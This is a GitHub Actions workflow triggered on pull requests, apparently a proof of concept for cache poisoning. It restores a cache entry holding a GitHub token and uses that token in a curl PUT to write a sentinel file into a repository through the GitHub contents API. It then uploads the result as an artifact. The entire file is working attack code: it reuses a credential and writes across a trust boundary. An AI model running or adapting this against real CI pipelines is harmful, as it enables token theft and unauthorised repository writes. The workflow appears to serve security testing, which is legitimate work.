name: fork-cache-pr
on: pull_request
permissions:
  contents: read
jobs:
  restore:
    runs-on: ubuntu-24.04
    steps:
      - name: Restore live base token cache
        id: restore
        uses: actions/cache/restore@v4
        with:
          path: cache
          key: apexblack-fork-cache-20260804-ghtoken2
      - name: Use live restored token for base write
        env:
          CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
        run: |
          set -euo pipefail
          mkdir -p result
          printf "cache-hit=%s\n" "$CACHE_HIT" > result/observation.txt
          if [ ! -s cache/token.txt ]; then
            printf "token-present=no\n" >> result/observation.txt
            cat result/observation.txt
            exit 0
          fi
          printf "token-present=yes\n" >> result/observation.txt
          printf "token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
          token="$(cat cache/token.txt)"
          http="$(curl -sS -X PUT \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer $token" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-ghtoken2-write.txt" \
            --data "$(printf '%s' '{"message":"fork PR live token cache sentinel","content":"Zm9yay1wci1naHRva2VuMi0yMDI2MDgwNAo="}')" \
            -o result/api-response.json -w "%{http_code}")"
          printf "put-http=%s\n" "$http" >> result/observation.txt
          cat result/observation.txt
          cat result/api-response.json
      - name: Upload live token observation
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fork-cache-pr-ghtoken2-observation
          path: result
# concurrent runner-pool control for live job token
